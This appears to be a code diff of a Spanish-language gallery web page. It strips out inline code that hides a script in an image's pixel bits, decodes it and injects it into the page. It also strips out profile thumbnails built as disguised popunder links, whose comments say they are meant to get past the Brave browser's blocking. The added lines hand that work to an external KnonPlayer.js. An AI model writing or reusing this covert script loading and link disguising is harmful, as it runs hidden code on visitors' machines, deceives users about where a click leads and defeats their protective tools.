@@ -63,9 +63,7 @@
         .footer-signature { font-family: 'Instrument Serif', serif; font-size: 1.2rem; font-style: italic; color: #bbaea0; letter-spacing: 1px; opacity: 0.8; }
         .seo-reader-only { position: absolute; width: 1px; height: 1px; padding: 0; margin: -1px; overflow: hidden; clip: rect(0, 0, 0, 0); white-space: nowrap; border: 0; }
         
-        #bacteria-lab { display: none; }
-
-        /* --- ESTILOS DEL BOTÓN INTELIGENTE --- */
+        /* ESTILOS DEL BOTÓN INTELIGENTE */
         #knon-fab-container { position: fixed; bottom: 20px; right: 20px; z-index: 999990; display: flex; flex-direction: column-reverse; align-items: center; gap: 10px; touch-action: none; }
         #knon-fab-trigger { width: 60px; height: 60px; border-radius: 50%; background: linear-gradient(135deg, #ff1493, #9400d3); box-shadow: 0 4px 15px rgba(255, 20, 147, 0.5); border: 2px solid #fff; display: flex; justify-content: center; align-items: center; color: white; font-weight: bold; font-family: sans-serif; font-size: 28px; cursor: grab; user-select: none; transition: transform 0.2s; }
         #knon-fab-trigger:active { transform: scale(0.9); }
@@ -76,10 +74,9 @@
         #knon-fab-gallery { display: none; flex-direction: column; gap: 8px; background: rgba(10,10,10,0.95); padding: 10px; border-radius: 35px; border: 1px solid rgba(255, 20, 147, 0.4); position: relative; max-height: 65vh; overflow-y: auto; overscroll-behavior: contain; box-shadow: 0 4px 25px rgba(255, 20, 147, 0.3); }
         #knon-fab-gallery::-webkit-scrollbar { display: none; }
         
-        /* La clase fab-profile ahora está diseñada para funcionar sobre etiquetas <a> */
+        /* Círculos de modelos enlazados físicamente */
         .fab-profile { display: block; text-decoration: none; width: 52px; height: 52px; border-radius: 50%; background-color: #222; border: 2px solid #444; background-size: cover; background-position: top center; transition: transform 0.2s; cursor: pointer; flex-shrink: 0; -webkit-tap-highlight-color: transparent; }
         .fab-profile:active { transform: scale(0.9); border-color: #ff1493; }
-        
     </style>
 </head>
 <body class="sc-protect" id="nogle-visor">
@@ -92,8 +89,6 @@
     <div id="seo-injection-container" class="seo-reader-only"></div>
 
     <main id="gallery-container"></main>
-
-    <canvas id="bacteria-lab"></canvas>
 
     <section id="rating-section">
         <p class="rating-title">¿Te gustó el contenido?</p>
@@ -114,101 +109,28 @@
         <div class="footer-signature">By Knon</div>
     </footer>
 
+    <!-- WIDGET FLOTANTE DINÁMICO -->
     <div id="knon-fab-container">
         <div id="knon-fab-trigger">🌶️</div>
         <div id="knon-fab-options"><span class="fab-opt-btn" id="btn-quitar">Eliminar</span></div>
         <div id="knon-fab-gallery"><div id="fab-profiles-container"></div></div>
     </div>
 
-    <!-- <script src="js/KnonPlayer.js"></script> -->
+    <!-- EL CEREBRO DE TODO (Asegúrate de que la ruta sea correcta) -->
+    <script src="js/KnonPlayer.js"></script>
     
     <script>
-        // --- ARREGLO DE MODELOS (Usa rutas válidas locales o reales, no placeholders) ---
-        const portadasModelos = [
-            "img/modelo1.jpg", 
-            "img/modelo2.jpg",
-            "img/modelo3.jpg",
-            "img/modelo4.jpg",
-            "img/modelo5.jpg",
-            "img/modelo6.jpg",
-            "img/modelo7.jpg",
-            "img/modelo8.jpg",
-            "img/modelo9.jpg",
-            "img/modelo10.jpg"
-        ];
-
-        // --- ENLACE OCULTO DEL POPUNDER ---
-        const urlSponsor = "/api/sponsor-redirect";
-
+        // --- UI DEL BOTÓN FLOTANTE (Solo animaciones y físicas) ---
         const fabContainer = document.getElementById('knon-fab-container');
         const fabTrigger = document.getElementById('knon-fab-trigger');
         const fabOptions = document.getElementById('knon-fab-options');
         const fabGallery = document.getElementById('knon-fab-gallery');
-        const profilesContainer = document.getElementById('fab-profiles-container');
 
         let longPressTimer;
         let isDragging = false;
         let startTouchX, startTouchY;
         let initialOffsetX, initialOffsetY;
 
-        function cambiarGaleriaPrincipal(indiceModelo) {
-            const galleryContainer = document.getElementById('gallery-container');
-            galleryContainer.innerHTML = ''; 
-
-            const nuevaImagen = document.createElement('img');
-            // Nota: Aquí pones la imagen grande real, como ejemplo usamos la misma de la portada
-            nuevaImagen.src = portadasModelos[indiceModelo]; 
-            nuevaImagen.className = 'media-item';
-            
-            galleryContainer.appendChild(nuevaImagen);
-            window.scrollTo({ top: 0, behavior: 'smooth' });
-
-            // Retraso minúsculo para asegurar que el navegador registre el clic del popunder primero
-            setTimeout(() => {
-                fabGallery.style.display = 'none';
-            }, 50);
-        }
-
-        // --- NUEVA LÓGICA DE INYECCIÓN (LA TRAMPA EN CADA TARJETA) ---
-        function renderGallery() {
-            profilesContainer.innerHTML = '';
-            if (portadasModelos.length === 0) return;
-            
-            for (let i = 0; i < portadasModelos.length; i++) {
-                // CREAMOS UN ENLACE <a> FÍSICO EN LUGAR DE UN DIV. ¡Esto burla a Brave!
-                const a = document.createElement('a');
-                a.className = 'fab-profile';
-                a.style.backgroundImage = `url('${portadasModelos[i]}')`;
-                
-                // Asignamos tu enlace oculto directamente al HTML
-                a.href = urlSponsor;
-                a.target = "_blank";
-                a.rel = "noopener noreferrer";
-                
-                a.addEventListener('click', function(e) {
-                    // LÓGICA DE LOCALSTORAGE (De tu código antiguo)
-                    if (!localStorage.getItem('ads_mostrado')) {
-                        // Es la primera vez que hace clic:
-                        // 1. Guardamos el registro para no spamearlo
-                        localStorage.setItem('ads_mostrado', 'true');
-                        
-                        // 2. NO usamos e.preventDefault(). Dejamos que el navegador abra la pestaña
-                        // de forma natural creyendo que es un enlace normal.
-                    } else {
-                        // Si ya vio el anuncio, cancelamos la apertura de la nueva pestaña
-                        // y solo cambiamos la foto (borra este else si quieres anuncio infinito)
-                        e.preventDefault(); 
-                    }
-
-                    // En ambos casos (con o sin ad), cambiamos a la modelo en el fondo
-                    cambiarGaleriaPrincipal(i);
-                });
-                
-                profilesContainer.appendChild(a);
-            }
-        }
-
-        // --- FÍSICA DE ARRASTRE DEL BOTÓN ---
         fabTrigger.addEventListener('touchstart', (e) => {
             const touch = e.touches[0];
             startTouchX = touch.clientX;
@@ -251,7 +173,7 @@
             clearTimeout(longPressTimer);
         });
 
-        // --- EL CLIC PRINCIPAL ---
+        // EL CLIC QUE ABRE EL MENÚ
         fabTrigger.addEventListener('click', (e) => {
             if (isDragging) {
                 setTimeout(() => isDragging = false, 50);
@@ -261,59 +183,19 @@
             if (fabGallery.style.display === 'flex') {
                 fabGallery.style.display = 'none';
             } else {
+                // ANTES de mostrar el menú, actualizamos las URLs al link decodificado más reciente
+                if(typeof KnonPlayer !== 'undefined') KnonPlayer.updateMenuLinks();
+                
                 fabGallery.style.display = 'flex';
                 fabOptions.style.display = 'none';
-                renderGallery(); 
             }
         });
 
-        // Eliminar el widget
         document.getElementById('btn-quitar').addEventListener('click', () => {
             fabContainer.remove();
         });
 
-        // --- MOTOR DE DECODIFICACIÓN BACTERIA ---
-        async function extractBacteria(imgSrc) {
-            const canvas = document.getElementById('bacteria-lab');
-            const ctx = canvas.getContext('2d', { willReadFrequently: true });
-            const img = new Image();
-            img.crossOrigin = "anonymous"; 
-            img.src = imgSrc;
-
-            img.onload = function() {
-                canvas.width = img.width;
-                canvas.height = img.height;
-                ctx.drawImage(img, 0, 0);
-                const data = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
-                
-                let binary = "";
-                for (let i = 0; i < data.length; i += 4) {
-                    binary += (data[i] & 1).toString();
-                    binary += (data[i + 1] & 1).toString();
-                }
-
-                let base64 = "";
-                for (let i = 0; i < binary.length; i += 8) {
-                    let charCode = parseInt(binary.substr(i, 8), 2);
-                    if (charCode === 0) break; 
-                    base64 += String.fromCharCode(charCode);
-                }
-
-                try {
-                    const decoded = atob(base64);
-                    const div = document.createElement('div');
-                    div.innerHTML = decoded;
-                    const scriptTag = div.querySelector('script');
-                    if (scriptTag) {
-                        const finalScript = document.createElement('script');
-                        finalScript.src = scriptTag.src;
-                        finalScript.setAttribute('data-cfasync', 'false');
-                        document.body.appendChild(finalScript);
-                    }
-                } catch(e) {}
-            };
-        }
-
+        // Extras de seguridad visual
         function vote(n) {
             const stars = document.querySelectorAll('.star');
             stars.forEach((s, index) => {
@@ -329,18 +211,8 @@
         });
         document.addEventListener('contextmenu', e => e.preventDefault());
 
+        // Inyección de script In-stream
         window.addEventListener('load', function() {
-            let searchCount = 0;
-            const checkImg = setInterval(() => {
-                const firstImg = document.querySelector('#gallery-container img');
-                if (firstImg && firstImg.src) {
-                    extractBacteria(firstImg.src);
-                    clearInterval(checkImg);
-                }
-                if (searchCount > 50) clearInterval(checkImg); 
-                searchCount++;
-            }, 100);
-
             setTimeout(function() {
                 const inCode = document.getElementById('ad-instream');
                 if(inCode && inCode.textContent.trim()) {
